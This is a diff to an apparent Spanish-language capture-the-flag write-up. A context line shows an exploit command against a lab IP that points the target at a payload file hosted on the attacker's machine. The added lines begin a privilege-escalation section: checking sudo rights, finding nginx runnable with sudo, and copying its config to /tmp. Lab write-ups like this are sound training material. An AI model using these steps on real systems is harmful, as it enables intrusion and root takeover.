@@ -139,3 +139,13 @@ go run main.go -i 10.10.11.243 -p 61616 -u http://10.10.14.70:8000/poc-linux.xml
 
 <figure><img src="../../../.gitbook/assets/Primer.png" alt=""><figcaption></figcaption></figure>
 
+## **Escalada de privilegios.**
+
+**Hacemos un `sudo -l`**&#x20;
+
+<figure><img src="../../../.gitbook/assets/Ruta.png" alt=""><figcaption></figcaption></figure>
+
+**Eso demuestra que se puede ejecutar con sudo nginx.**
+
+**Ahora navegamos a la carpeta /home ,y copiamos el archivo /etc/nginx/nginx.conf a /tmp**
+
